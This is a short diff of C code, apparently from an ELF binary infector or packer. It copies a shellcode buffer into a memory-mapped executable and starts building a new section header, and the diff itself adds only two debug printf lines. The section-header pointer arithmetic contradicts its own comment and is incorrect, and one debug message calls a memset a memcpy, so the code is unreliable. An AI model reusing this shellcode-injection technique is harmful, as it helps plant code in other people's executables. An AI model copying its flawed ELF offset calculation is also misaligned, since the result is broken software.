@@ -220,9 +220,11 @@ void	inject_new_header(void *map)
 	off_t shellcode_offset = size_of_file - sizeof(shellcode) - 65;
 	memcpy(map + shellcode_offset, shellcode, sizeof(shellcode));
 
+	printf("after first memcpy\n");
 	// this should be sec of map + offset till section headers + number of section headers * size (typically 64 cuz 64ELF)
 	Elf64_Shdr *new_shdr = (Elf64_Shdr *)(map + ehdr->e_shnum + ehdr->e_shoff * ehdr->e_shentsize); 
 	memset(new_shdr, 0, sizeof(Elf64_Shdr));
+	printf("after second memcpy\n");
 
 	new_shdr->sh_name = 0; // We'll skip name setup for now
 	new_shdr->sh_type = SHT_PROGBITS;
